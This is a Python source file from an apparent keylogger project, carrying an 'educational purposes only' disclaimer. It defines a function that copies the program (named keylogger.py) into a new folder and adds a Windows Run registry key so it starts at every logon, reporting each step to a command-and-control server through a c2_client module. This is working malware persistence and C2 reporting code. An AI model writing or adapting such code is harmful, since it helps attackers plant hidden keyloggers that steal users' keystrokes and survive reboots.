###########################################################################################
#### author: NC
#### date: 08/08/2025
#### Python version: 3.8
####
#### ⚠️ DISCLAIMER:#
#### This file is part of a cybersecurity project.
#### It is intended for educational and research purposes only.
#### Must be executed in a controlled environment (e.g., sandbox or VM).
#### Any misuse of this code is strictly prohibited. The author declines any responsibility.
############################################################################################



import os
import shutil
import winreg
import c2_client



def registry_modification(usb_file, new_folder):
    """
    This function copy the software on the %APPDATA% directory and modify the Windows registry to make the software persistent.
    """

    path_file = os.path.join(new_folder, usb_file)
    shutil.copy2(usb_file, new_folder)

    c2_client.send_to_c2_server(f"[*] keylogger.py was moved at {new_folder}\n")

    register = winreg.HKEY_CURRENT_USER
    register_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

    reg = winreg.ConnectRegistry(None, register)
    key = winreg.OpenKey(reg, register_path, 0, access = winreg.KEY_WRITE)
    winreg.SetValueEx(key, "Educational_KeyLogger", 0, winreg.REG_SZ, path_file)

    c2_client.send_to_c2_server(f"[*] Register modification performed: {reg}")








